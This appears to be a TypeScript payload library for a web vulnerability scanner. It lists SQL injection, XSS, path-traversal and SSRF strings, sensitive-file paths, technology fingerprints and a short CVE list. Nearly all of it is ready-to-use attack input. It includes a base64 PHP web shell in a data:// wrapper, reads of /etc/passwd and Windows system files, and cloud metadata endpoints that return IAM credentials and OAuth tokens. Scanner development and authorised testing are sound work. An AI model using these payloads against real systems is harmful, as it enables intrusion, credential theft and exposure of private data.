// Comprehensive payload definitions for vulnerability testing

export const SQL_PAYLOADS = {
  // Error-based SQL injection payloads
  errorBased: [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "') OR ('1'='1",
    "1' AND '1'='1",
    "1\" AND \"1\"=\"1",
    "' AND 1=CONVERT(int,(SELECT @@version)) --",
    "' AND 1=1 UNION SELECT NULL --",
    "1 OR 1=1",
    "1' OR '1'='1",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1'--",
    "' HAVING 1=1--",
    "' GROUP BY columnnames HAVING 1=1 --",
    "' UNION SELECT 1,2,3--",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "-1' UNION SELECT 1,2,3--+",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1) --",
    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
  ],

  // Union-based SQL injection payloads
  unionBased: [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "-1 UNION SELECT 1,2,3--",
    "-1 UNION SELECT 1,2,3,4--",
    "-1 UNION SELECT 1,2,3,4,5--",
    "0 UNION SELECT username,password FROM users--",
    "' UNION SELECT @@version--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
  ],

  // Time-based blind SQL injection payloads
  timeBased: [
    "' AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'); WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND SLEEP(5) AND '1'='1",
    "1' AND BENCHMARK(5000000,MD5('test'))--",
    "' AND pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1); WAITFOR DELAY '0:0:5'--",
    "1)); WAITFOR DELAY '0:0:5'--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=2,SLEEP(5),0)--",
  ],

  // Boolean-based blind SQL injection
  booleanBased: [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "' OR 1=1--",
    "' OR 1=2--",
    "1' AND 1=1#",
    "1' AND 1=2#",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND substring(@@version,1,1)='5",
    "' AND substring(@@version,1,1)='M",
  ],
};

export const SQL_ERROR_PATTERNS = [
  // MySQL - specific patterns only
  "You have an error in your SQL syntax.*?near",
  "SQL syntax.*?MySQL",
  "Warning.*?mysql_query\\(",
  "Warning.*?mysql_fetch",
  "MySqlClient\\.",
  "MySqlException",
  "com\\.mysql\\.jdbc\\.Driver",
  "com\\.mysql\\.jdbc\\.exceptions",
  "java\\.sql\\.SQLException.*?MySQL",
  
  // PostgreSQL - specific patterns only
  "PostgreSQL.*?ERROR",
  "PG::SyntaxError:",
  "org\\.postgresql\\.util\\.PSQLException",
  "Npgsql\\.NpgsqlException",
  "ERROR:\\s+syntax error at or near \"",
  "org\\.postgresql\\.Driver",
  
  // Microsoft SQL Server - specific patterns only
  "Msg \\d+, Level \\d+, State \\d+",
  "\\[Microsoft\\]\\[ODBC SQL Server Driver\\]",
  "\\[Microsoft\\]\\[SQL Server Native Client",
  "com\\.microsoft\\.sqlserver\\.jdbc\\.SQLServerException",
  "System\\.Data\\.SqlClient\\.SqlException",
  "Unclosed quotation mark after the character string '",
  "SQLServer JDBC Driver",
  "ODBC SQL Server Driver",
  
  // Oracle - specific patterns only
  "\\bORA-\\d{5}:",
  "oracle\\.jdbc\\.driver",
  "java\\.sql\\.SQLException.*?ORA-",
  "PLS-\\d{5}:",
  
  // SQLite - specific patterns only
  "SQLite\\.Exception",
  "System\\.Data\\.SQLite\\.SQLiteException",
  "near \".*?\": syntax error.*?SQLITE",
  "SQLITE_ERROR.*?SQL",
  
  // JDBC/Driver specific (cannot appear in normal pages)
  "java\\.sql\\.SQLException:\\s+",
  "JDBC.*?SQLException",
];

export const XSS_PAYLOADS = {
  // Polyglot payloads that work in multiple contexts
  polyglot: [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    "'\"-->]]>*/</script></style></title></textarea></noscript></template></xmp><svg/onload=alert()>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(1)\">CLICKME",
  ],

  // Reflected XSS payloads
  reflected: [
    "<script>alert('XSS')</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=javascript:alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input type=text value=`` <div/onmouseover=`alert(1)`>X</div>",
    "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=# onmouseover=\"alert('xxs')\">",
    "<IMG SRC= onmouseover=\"alert('xxs')\">",
    "<IMG onmouseover=\"alert('xxs')\">",
    "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
    "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
  ],

  // Event handlers for XSS
  eventHandlers: [
    "onafterprint", "onbeforeprint", "onbeforeunload", "onerror", "onhashchange",
    "onload", "onmessage", "onoffline", "ononline", "onpagehide", "onpageshow",
    "onpopstate", "onresize", "onstorage", "onunload", "onblur", "onchange",
    "oncontextmenu", "onfocus", "oninput", "oninvalid", "onreset", "onsearch",
    "onselect", "onsubmit", "onkeydown", "onkeypress", "onkeyup", "onclick",
    "ondblclick", "onmousedown", "onmousemove", "onmouseout", "onmouseover",
    "onmouseup", "onwheel", "ondrag", "ondragend", "ondragenter", "ondragleave",
    "ondragover", "ondragstart", "ondrop", "onscroll", "oncopy", "oncut", "onpaste",
  ],

  // Filter bypass techniques
  filterBypass: [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script x>alert(1)</script>",
    "<script x>alert('XSS')</script x>",
    "<<script>alert(1)//<</script>",
    "<script>\\u0061lert(1)</script>",
    "<script>eval('\\x61lert(1)')</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<svg><script>alert&#40;1&#41;</script>",
    "<svg><script>alert&lpar;1&rpar;</script>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
  ],
};

export const LFI_PAYLOADS = {
  // Basic path traversal
  basic: [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
  ],

  // Null byte injection (older systems)
  nullByte: [
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.php",
    "../../../etc/passwd%00.jpg",
    "....//....//....//etc/passwd%00",
  ],

  // PHP wrappers
  phpWrappers: [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
  ],

  // Log poisoning paths
  logFiles: [
    "/var/log/apache/access.log",
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
  ],

  // Windows specific
  windows: [
    "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\windows\\system.ini",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
  ],
};

export const LFI_SUCCESS_PATTERNS = [
  "root:x:0:0",
  "daemon:x:1:1",
  "bin:x:2:2",
  "[fonts]",
  "[extensions]",
  "for 16-bit app support",
  "; for 16-bit app support",
  "[boot loader]",
  "[operating systems]",
  "localhost",
  "127.0.0.1",
];

export const SSRF_PAYLOADS = {
  // Internal network
  internal: [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",
    "http://0x7f.0x0.0x0.0x1",
    "http://2130706433",
    "http://127.1",
    "http://127.0.1",
  ],

  // Cloud metadata endpoints
  cloudMetadata: [
    // AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    
    // Google Cloud
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    
    // Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    
    // DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    
    // Kubernetes
    "https://kubernetes.default.svc/",
  ],

  // Protocol handlers
  protocols: [
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/info",
    "gopher://127.0.0.1:25/_HELO%20localhost",
    "ftp://127.0.0.1:21/",
    "ldap://127.0.0.1:389/",
  ],

  // Internal services
  internalPorts: [
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:11211",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
  ],

  // Bypass techniques
  bypass: [
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    "http://127.0.0.1.xip.io",
    "http://spoofed.burpcollaborator.net",
    "http://0",
    "http://0.0.0.0",
    "http://localhost:80",
    "http://localhost:443",
    "http://localhost:8080",
  ],
};

export const SENSITIVE_FILES = {
  // Configuration files
  config: [
    ".env",
    ".env.local",
    ".env.production",
    ".env.development",
    ".env.backup",
    ".env.old",
    ".env.bak",
    "config.php",
    "config.inc.php",
    "configuration.php",
    "settings.php",
    "config.yml",
    "config.yaml",
    "config.json",
    "database.yml",
    "secrets.yml",
    "credentials.json",
    "app.config",
    "web.config",
    "appsettings.json",
    "application.properties",
    "application.yml",
  ],

  // Version control
  vcs: [
    ".git/HEAD",
    ".git/config",
    ".git/index",
    ".git/logs/HEAD",
    ".git/refs/heads/master",
    ".git/refs/heads/main",
    ".gitignore",
    ".svn/entries",
    ".svn/wc.db",
    ".hg/requires",
    ".bzr/README",
  ],

  // Backup files
  backups: [
    "backup.sql",
    "backup.zip",
    "backup.tar.gz",
    "backup.tar",
    "database.sql",
    "dump.sql",
    "db.sql",
    "data.sql",
    "mysql.sql",
    "site.zip",
    "www.zip",
    "html.zip",
    "backup.bak",
    "old.zip",
    "archive.zip",
    "db_backup.sql",
  ],

  // Debug/Info files
  debug: [
    "phpinfo.php",
    "info.php",
    "test.php",
    "debug.php",
    "debug.log",
    "error.log",
    "error_log",
    "access.log",
    "access_log",
    "laravel.log",
    "symfony.log",
    "npm-debug.log",
    "yarn-error.log",
  ],

  // CMS specific
  cms: [
    // WordPress
    "wp-config.php",
    "wp-config.php.bak",
    "wp-config.php~",
    "wp-config.php.old",
    "wp-config.php.save",
    "wp-config.php.swp",
    "wp-config.php.txt",
    "xmlrpc.php",
    "wp-includes/version.php",
    "readme.html",
    "license.txt",
    
    // Joomla
    "configuration.php",
    "configuration.php.bak",
    "htaccess.txt",
    
    // Drupal
    "sites/default/settings.php",
    "CHANGELOG.txt",
    "INSTALL.txt",
    
    // Magento
    "app/etc/local.xml",
    "app/etc/env.php",
  ],

  // Server configuration
  server: [
    ".htaccess",
    ".htpasswd",
    "server-status",
    "server-info",
    "nginx.conf",
    "httpd.conf",
    "apache2.conf",
    "crossdomain.xml",
    "clientaccesspolicy.xml",
    "robots.txt",
    "sitemap.xml",
  ],

  // IDE and editor files
  ide: [
    ".idea/workspace.xml",
    ".vscode/settings.json",
    ".vscode/launch.json",
    "sftp-config.json",
    ".DS_Store",
    "Thumbs.db",
    "*.swp",
    "*~",
    ".project",
    ".settings",
  ],

  // Package manager files (may leak info)
  packages: [
    "package.json",
    "package-lock.json",
    "composer.json",
    "composer.lock",
    "Gemfile",
    "Gemfile.lock",
    "requirements.txt",
    "Pipfile",
    "yarn.lock",
    "pom.xml",
    "build.gradle",
  ],
};

export const TECHNOLOGY_SIGNATURES = {
  // CMS Detection
  wordpress: {
    paths: ["/wp-login.php", "/wp-admin/", "/wp-content/", "/wp-includes/"],
    headers: ["X-Powered-By: PHP", "Link:.*wp-json"],
    content: ["wp-content", "wp-includes", "WordPress", "/xmlrpc.php"],
  },
  joomla: {
    paths: ["/administrator/", "/components/", "/modules/", "/templates/"],
    headers: [],
    content: ["Joomla!", "/media/system/", "com_content"],
  },
  drupal: {
    paths: ["/node/1", "/user/login", "/admin/", "/sites/default/"],
    headers: ["X-Generator: Drupal", "X-Drupal-Cache"],
    content: ["Drupal", "drupal.js", "/misc/drupal.js"],
  },
  magento: {
    paths: ["/skin/frontend/", "/js/mage/", "/admin/"],
    headers: [],
    content: ["Mage.Cookies", "Magento", "/skin/frontend/"],
  },

  // Frameworks
  laravel: {
    paths: [],
    headers: ["Set-Cookie: laravel_session"],
    content: ["laravel", "XSRF-TOKEN"],
  },
  django: {
    paths: ["/admin/"],
    headers: ["Set-Cookie: csrftoken", "Set-Cookie: django"],
    content: ["csrfmiddlewaretoken", "Django"],
  },
  rails: {
    paths: [],
    headers: ["X-Runtime", "X-Request-Id", "Set-Cookie: _.*_session"],
    content: ["csrf-token", "rails-ujs"],
  },
  express: {
    paths: [],
    headers: ["X-Powered-By: Express"],
    content: [],
  },

  // Servers
  nginx: {
    paths: [],
    headers: ["Server: nginx"],
    content: [],
  },
  apache: {
    paths: [],
    headers: ["Server: Apache"],
    content: [],
  },
  iis: {
    paths: [],
    headers: ["Server: Microsoft-IIS", "X-Powered-By: ASP.NET"],
    content: [],
  },

  // Languages
  php: {
    paths: [],
    headers: ["X-Powered-By: PHP"],
    content: [".php"],
  },
  aspnet: {
    paths: [],
    headers: ["X-AspNet-Version", "X-Powered-By: ASP.NET"],
    content: [".aspx", ".ashx", "ViewState"],
  },
  java: {
    paths: [],
    headers: ["X-Powered-By: Servlet", "Set-Cookie: JSESSIONID"],
    content: [".jsp", ".do", ".action"],
  },
};

export const CVE_DATABASE: Record<string, Array<{id: string; description: string; severity: string}>> = {
  wordpress: [
    { id: "CVE-2023-2982", description: "WordPress Core < 6.2.1 - Cross-Site Scripting", severity: "Medium" },
    { id: "CVE-2023-28121", description: "WooCommerce Payments < 5.6.2 - Authentication Bypass", severity: "Critical" },
    { id: "CVE-2023-23488", description: "WordPress Plugin Contact Form 7 - SQL Injection", severity: "High" },
  ],
  joomla: [
    { id: "CVE-2023-23752", description: "Joomla! < 4.2.8 - Unauthenticated Information Disclosure", severity: "High" },
    { id: "CVE-2023-23753", description: "Joomla! < 4.2.8 - Improper Access Control", severity: "Medium" },
  ],
  drupal: [
    { id: "CVE-2019-6340", description: "Drupal Core - Remote Code Execution", severity: "Critical" },
    { id: "CVE-2018-7600", description: "Drupalgeddon2 - Remote Code Execution", severity: "Critical" },
  ],
  apache: [
    { id: "CVE-2021-41773", description: "Apache HTTP Server 2.4.49 - Path Traversal", severity: "Critical" },
    { id: "CVE-2021-42013", description: "Apache HTTP Server 2.4.50 - Path Traversal & RCE", severity: "Critical" },
  ],
  nginx: [
    { id: "CVE-2021-23017", description: "Nginx Resolver Off-by-One Heap Write", severity: "High" },
  ],
  php: [
    { id: "CVE-2019-11043", description: "PHP-FPM Remote Code Execution", severity: "Critical" },
  ],
};
